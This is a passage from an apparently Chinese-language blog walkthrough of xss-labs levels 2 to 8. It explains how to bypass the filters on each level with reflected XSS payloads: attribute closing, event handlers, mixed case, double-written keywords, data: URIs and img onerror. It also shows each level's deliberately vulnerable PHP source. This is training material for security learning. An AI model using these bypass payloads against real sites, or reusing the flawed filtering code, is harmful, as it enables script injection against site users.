labe/构弹l）</h2><p>从url地址来看，依然是<code>get</code>方式传递参数，所以猜测考察的还是<code>反射型XSS</code>。只不过这一关将参数名换成了keyword。页面中央出现了一个输入框和一个“搜索”按钮。先看看网页源代码</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528170632693.png" alt="image-20200528170632693"></p><p>​        源码来看该页面大致的功能就是通过点击“搜索”按钮可以将填入输入框中的内容以get方式提交给服务器上的level2.php。经过服务器的动态处理之后又会将参数keyword的值插入到标签之中以及添加到标签中的value属性的值内。</p><p>想通了该页的大致功能之后就可以构造恶意语句进行测试了，这里还是沿用上一关中的弹窗代码，操作如下：</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528164221139.png" alt="image-20200528164221139"></p><p>但是想象中的弹窗并没有出现，恶意代码直接被打印到了页面之上。这是怎么回事呐？看看此时的网页源码</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528170906453.png" alt="image-20200528170906453"></p><p>​    可以看到在标签之中的恶意代码被编码了。其中<code>&lt;、&gt;</code>都被编码成了html字符实体。猜测在服务器端用<code>htmlspecialchars()</code>函数对keyword参数的值进行了处理。接着往下看可以看到插入到value参数值中的恶意代码并没有被编码而是直接原样返回的。但是问题是这里的js代码在标签属性值中，浏览器是无法执行的。</p><p>​        既然上面的恶意代码被编码了，那么只能从属性值中的恶意代码处进行突破了。要想浏览器执行这里的弹窗代码，只需要<strong>将属性的引号和标签先闭合</strong>就可以了。操作如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;//</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528171552893.png" alt="image-20200528171552893"></p><p>​    可以看到浏览器成功弹窗了，说明我们提交的恶意代码被浏览器执行了。来看看此时的网页源码    </p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528171659067.png" alt="image-20200528171659067"></p><p><strong>能成功执行js代码了。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=<span class="string">&quot;&quot;</span> &gt; &lt;script&gt;alert(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt; <span class="comment">//&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>在我们构造的恶意代码中<strong>最后的//是为了将后面的”&gt;注释掉。</strong></p><p>完成弹窗之后看看服务器端文件的源码</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528171959417.png" alt="image-20200528171959417"><br>         从上图源码可知，在箭头1处将get方式传递到服务器端的keyword参数的值赋给str变量。在箭头2处是用<code>htmlspecialchars()</code>函数对变量str进行处理之后显示到网页上。但是在箭头3处却是直接将变量值插入到了标签的value属性值中，因为这里并没有对敏感字符进行编码和过滤，所以可以通过构造实现XSS攻击。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p><strong>闭合绕过，闭合前面的标签，从而成功逃逸标签的属性束缚</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>那么当提交搜索后，前端的搜索框内的input标签就变成了下面</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;keyword&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><p>跟sql注入差不多是不是，我们前面的 “&gt; 闭合了input标签，使恶意代码成功逃逸出来，然后可以执行</p><p>##xss-labs level 3（ htmlspecialchar() and close with ’ 、绕函弹）</p><p>先输入字符串test进行尝试</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528172832761.png" alt="image-20200528172832761"></p><p>从页面响应可以看到通过keyword参数传递到服务器端的值在页面中有两个显示的地方。来看看网页源代码</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528172910844.png" alt="image-20200528172910844"></p><p>看起来跟第二关时没什么区别，所以还无法确定在服务器端是否对敏感字符进行了过滤、编码等操作。接着<strong>构造弹窗代码</strong>进行测试</p><p>但是浏览器并没有成功弹窗，看看网页源码是怎么回事</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528175820153.png" alt="image-20200528175820153"></p><p>​        原来这两处都将<code>&lt;、&gt;</code>这样的敏感字符编码成了<strong>html字符实体</strong>。猜测服务器端在这两处都用<code>htmlspecialchars()</code>函数进行了处理。既然关键的&lt;、&gt;字符被编码了，<strong>怎样才能成功执行弹窗的代码呐？</strong></p><p>这里可以通过<strong>标签的一些特殊事件</strong>来执行js代码，所以可以构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="string">&#x27;onfocus=javascript:alert(&#x27;</span>xss<span class="string">&#x27;) &gt; //&amp;submit=搜索</span></span><br></pre></td></tr></table></figure><p>结果发现并没有直接弹窗，这是因为onfocus事件的特殊性造成的。</p><p> <code>onfocus</code>是<code>javascript</code>中在对象获得焦点时发生的事件</p><p>最简单的实例就是网页上的一个输入框,当使用鼠标点击该输入框时输入框被选中可以输入内容的时候就是该输入框获得焦点的时候,此时输入框就会触发<code>onfocus</code>事件.</p><p>因此点击当前页面的输入框就可以完成弹框了。</p><p>于是事件成功执行<strong>javascript:伪协议。</strong></p><hr><p>但是也可以使用如下的尝试</p><p>如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onmouseover&#x3D;&#39;javascript:alert(1)</span><br></pre></td></tr></table></figure><p> <strong>但为什么要这要做呢？</strong>，如果换成*” onmouseover=” javascript:alert(1)* ,却并不会成功</p><p>这是因为，<input type="text" value=" &#039 onmouseover=&#039 javascript:alert(1)"></p><p><strong>只有使用单引号，转换出来的&amp;#039才有意义</strong></p><hr><p>或者使用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;onclick=&#x27;</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>之所以不用<code>&lt;script&gt;</code>是因为<code>&lt;&gt;</code>仍然会被转义，只是由于当作字符串来显示，所以看到的是正常的而已。</p><hr><p><strong>看看服务器端文件源码</strong></p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528180541953.png" alt="image-20200528180541953"></p><p>可以看到服务器端在页面显示的位置对参数值都用<strong>htmlspecialchars()函数</strong>进行处理了。</p><h2 id="xss-labs-level-4（filter-lt-gt-and-close-with-“、构绕函弹）"><a href="#xss-labs-level-4（filter-lt-gt-and-close-with-“、构绕函弹）" class="headerlink" title="xss-labs level 4（filter &lt;&gt; and close with “、构绕函弹）"></a>xss-labs level 4（filter &lt;&gt; and close with “、构绕函弹）</h2><p>可参考：<code>https://blog.csdn.net/u014029795/article/details/103177149</code></p><p>看到这一关还是采用<code>get</code>方式传递参数，并且该参数的值在页面中有两处显示位。</p><p> 首先依然用<code>弹窗代码</code>测试服务器端对用户输入做了哪些操作</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528202028147.png" alt="image-20200528202028147"></p><p>可以看到浏览器并没有成功弹窗，第一个显示位直接将参数值显示出来了，但是在输入框中显示却跟我们提交的参数值有点出入。看看网页源码</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528202140964.png" alt="image-20200528202140964"></p><p>从上图不难看出在箭头1处将参数值中的&lt;、&gt;字符进行编码显示了，在箭头2处直接将&lt;、&gt;字符给删除了。</p><p>用上一关的事件触发弹窗代码测试看看，因为这里只是删除了<code>&lt;、&gt;</code>符号，<strong>事件触发却不需要使用这两个符号</strong>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="string">&quot;onfocus=javascript:alert(1) &quot;</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="string">&quot; onclick=javascript:alert(1) &quot;</span></span><br></pre></td></tr></table></figure><p>响应的页面依然是不会自动弹窗，在点击输入框之后成功触发了事件进行弹窗。</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528202419106.png" alt="image-20200528202419106"></p><p>查看网页源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 align=center&gt;没有找到和\&amp;quot;onfocus=javascript:alert(<span class="number">1</span>) \&amp;quot;相关的结果.&lt;/h2&gt;<span class="xml"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span></span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;\&quot;onfocus=javascript:alert(1) \&quot;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br></pre></td></tr></table></figure><p>而后端的代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str2=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str);                    <span class="comment">// &gt;被空格替换了</span></span><br><span class="line">$str3=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str2);                 <span class="comment">// &lt;被空格替换了</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str3.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="xss-labs-level-5-href-闭新java弹"><a href="#xss-labs-level-5-href-闭新java弹" class="headerlink" title="xss-labs level 5( href /闭新java弹)"></a>xss-labs level 5( href /闭新java弹)</h2><p>同之前一样，这一关看起来还是反射型的XSS。但是由于不知道服务器端到底做了什么样的操作，所以用弹窗代码测试</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528210001126.png" alt="image-20200528210001126"></p><p>跟想象中的一样并没有成功弹窗，接着查看网页源码看看服务器端对我们提交的代码做了什么处理<img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528210550841.png" alt="image-20200528210550841"></p><p> 从图中看到在第一处显示位应该还是被<code>htmlspecialchars()函数</code>处理过才返回到浏览器显示的。而在第二处显示位可以看到在第一个字符中<code>插入了一个_符号</code>。</p><p> 这里<strong>猜测</strong>在服务器端是对提交的参数值进行了<code>正则匹配</code>，然后在出现的第一个字符串中插入一个_符号导致代码无法成功执行。</p><p> 从这么来看的话，之前通过事件触发的代码应该依然可以奏效，测试一下看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="string">&quot;onfocus=javascript:alert(1) &quot;</span></span><br></pre></td></tr></table></figure><p>但是这一次并没有成功触发弹窗。看看网页源码<img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528210912222.png" alt="image-20200528210912222"></p><h2 id="level-6-——Case-Sensitive、大小写"><a href="#level-6-——Case-Sensitive、大小写" class="headerlink" title="level 6 ——Case Sensitive、大小写"></a>level 6 ——Case Sensitive、大小写</h2><p>提交<code>&lt;script&gt;alert(‘xss’)&lt;/script&gt;</code>看看服务器端做了什么处理</p><p>在script字符中插入<code>_</code>破坏语义。那么接着试试<strong>事件触发</strong>执行js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onclick=javascript:alert(1) &quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528213706895.png" alt="image-20200528213706895"></p><p>可以看到在<code>on</code>字符之间也插入了<code>_</code>来防止XSS的产生。最后试试用别的标签执行js代码，如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a href=javascript:alert(1) &gt; xss&lt;/a&gt; //</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528213819386.png" alt="image-20200528213819386"></p><p>结果发现上一关尝试成功的标签也失效了，这里在href字符中插入了_来破坏语义。</p><p>这就有点过分了，<strong>还有什么办法能够成功执行js代码呐？</strong></p><p>不要慌，我们可以试试<strong>大小写混写</strong>来尝试能不能绕过。因为这里<strong>没有对&lt;、&gt;进行过滤，但是对script、on、href这样的字符应该是进行了字符替换</strong>。所以这里尝试构造如下语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;a hREF=javascript:alert(1) &gt; xss&lt;/a&gt; //</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; &gt;&lt;sCRipt&gt;alert(&#x27;XSS&#x27;)&lt;/sCript&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528214105085.png" alt="image-20200528214105085"></p><p>可以看到这一次点击页面响应中超链接成功弹窗了。</p><p>这里值得一提的是<strong>因为我们改动的是标签中的href属性的大小写，而在html中对大小写是不敏感的</strong>。因此在浏览器端我们的恶意代码才能成功执行。</p><p>接着我们看看<strong>源文件的代码</strong>是怎样的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str2=str_replace(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,$str);                      <span class="comment">//1</span></span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);                            <span class="comment">//2</span></span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);                            <span class="comment">//3</span></span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);                        <span class="comment">//4</span></span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);                        <span class="comment">//5</span></span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str6.<span class="string">&#x27;&quot;&gt;                            //6</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从源码来看服务器端做的防护措施比我们想象的要多得多。接下来也会根据图中的一些代码来提一提在前五关中没有提过的执行js代码的其他一些方式。</p><p>从<code>1</code>的地方可以看到是用字符这一类的恶意代码。</p><p>从<code>2</code>的地方可以看到是用字符<code>on</code>去匹配参数值，如果匹配到了就进行替换破坏原有语义。这里<strong>主要防范的是</strong>利用<strong>带有on字符的事件来触发恶意代码</strong>，比如前面用到过的<code>onfocus</code>事件。</p><p>从<code>3</code>的地方可以看到是用字符<code>src</code>去进行匹配，但是貌似我们之前没有提到过含有此类字符的恶意代码啊。说到这里我们就不得不提到标签了。熟悉html的人都会知道在标签中<strong>引用图片</strong>会用到一个属性就是<code>src</code>。正常的引用图片就是<strong>将待引用图片的地址赋值给src属性</strong>。但是在<code>js</code>中如果<code>src</code>属性的<strong>值不正常或者无法访问到时就可以触发一个onerror事件来执行js代码</strong>。这里利用第一关来演示一下效果</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">111</span>  <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528222401706.png" alt="image-20200528222401706"></p><p>从<code>4</code>的地方可以看到这里是用字符<code>data</code>进行匹配的，同上面一样该字符在之前的演示中也没有出现过。现在一般有点<code>XSS</code>意识的管理员都懂得过滤<code>javascript</code>与<code>script</code>等关键字。但是对于<code>data</code>的认识却并不多，也就很少有对它进行过滤的。</p><p>Data在我看来就是<strong>对字符进行编码的一种设定</strong>，比如如果在实际情况中<code>javascript</code>、<code>script</code>等关键字被过滤掉了之后，可以用如下语句进行尝试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=</span><br></pre></td></tr></table></figure><p>这条语句和</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(<span class="string">&quot;xss&quot;</span>) </span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">&quot;xss&quot;</span>)</span><br></pre></td></tr></table></figure><p> 的作用是一样的。</p><p>**data:**的语法从上面的语句中已经可以看得很清楚了，<code>base64</code>为编码方式，可以任意改，可以<code>UTF-8</code>可以<code>UTF-7</code>，只要将后面编码后的内容做相应的更改就可以了。对于它的利用可以参考下面的演示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.bj.com/xss/level1.php?name=&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=&quot;&gt;ceshi&lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;经过base64后为PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=</span></span><br></pre></td></tr></table></figure><p>点击页面中显示的超链接即可触发弹窗</p><p>最后</p><p>从<code>5</code>处我们就可以看到是用字符<code>href</code>来进行匹配了，防止的就是通过在<code>href</code>属性中插入<code>js</code>代码来点击执行。</p><h2 id="level-7-double-writing"><a href="#level-7-double-writing" class="headerlink" title="level 7 double writing"></a>level 7 double writing</h2><p>尝试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(XSS)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528223702563.png" alt="image-20200528223702563"></p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528223724016.png" alt="image-20200528223724016"></p><p>可以看到上面的依然是进行编码处理，但是下面的则是把<code>script</code>字符直接删除了。接着再试试事件触发</p><p>接着尝试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onfocus=javascript:alert(1) &quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528224118834.png" alt="image-20200528224118834"></p><p>可以看到<code>onfocus</code>事件直接把<code>on</code>字符删除了，<code>javascript</code>中的<code>script</code>字符也被删除了。如果是这样的话就不需要再继续尝试新的标签了，看看前面的<code>大小写</code>能不能绕过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="string">&quot; onfocus=javaSCRIPt:alert(1) &quot;</span> </span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528230251046.png" alt="image-20200528230251046"></p><p>可以看到大小写绕过失败了。那么这里可以尝试<strong>双写关键字</strong>来进行绕过，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword&#x3D;&quot; oonnclick&#x3D;javaSscriptCRIPt:alert(1) &quot; </span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528230806846.png" alt="image-20200528230806846"></p><p>源文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.$str6.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="level-8——-with-htmlspecialchar-、DOM、特殊字符隔开绕过-编码绕过"><a href="#level-8——-with-htmlspecialchar-、DOM、特殊字符隔开绕过-编码绕过" class="headerlink" title="level 8—— with htmlspecialchar()、DOM、特殊字符隔开绕过, 编码绕过"></a>level 8—— with htmlspecialchar()、DOM、特殊字符隔开绕过, 编码绕过</h2><p><strong>存储型的xss漏洞</strong></p><p>跳转到第八关的页面跟之前有些区别</p><p>直接用输入框的内容测试之后查看网页源码</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528231435084.png" alt="image-20200528231435084"></p><p>点击链接后</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528231531002.png" alt="image-20200528231531002"></p><p>​        可以看到提交的参数值一个会插入到标签的<code>value</code>属性值中，一个会插入到下方标签的<code>href</code>属性值中。</p><p>那么接着来测试一下服务器端对关键字等会做一些什么处理。</p><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a><strong>第一步</strong></h3><p>用下面的进行测试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528231738980.png" alt="image-20200528231738980"></p><p>可以看到在value属性值中的参数值被编码成了字符实体，在href属性值中script字符被插入了_字符破坏语义。</p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a><strong>第二步</strong></h3><p>用<code>事件触发</code>来测试一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="string">&quot; onfocus=javascript:alert(‘xss’)&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528232039288.png" alt="image-20200528232039288"></p><p>从结果发现<code>onfocus</code>一类的事件也被破坏了，而且我们用来闭合引号的引号也被编码了。</p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>接着试试<strong>大小写</strong>绕过</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528232637076.png" alt="image-20200528232637076"></p><p>看来大小写也无法绕过了。因为此处<strong>没有对关键字进行删除</strong>，所以就不进行双写测试了。</p><p>那么这里<strong>该怎么绕过呐？</strong></p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>其实还可以将我们要<strong>提交的js代码进行编码</strong></p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528233042137.png" alt="image-20200528233042137"></p><h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><p>思路就是利用<code>a</code>标签中的 <code>href</code>属性来执行<code>javascript</code>代码,简单来讲就是</p><ul><li>如果 href后面跟一个<code>url</code>的话就会去<code>访问url地址</code>，</li><li>如果是<code>javascript伪协议(javascript:)</code>就会<code>执行javascript</code>。</li></ul><p>那知道了利用的原理，我们还要应对<strong>过滤</strong>，这里有<strong>两个办法</strong></p><p><strong>（1）</strong>利用href属性引号中的内容可以使用<strong>空字符、空格、TAB换行、注释、特殊的函数，将代码隔开</strong>。 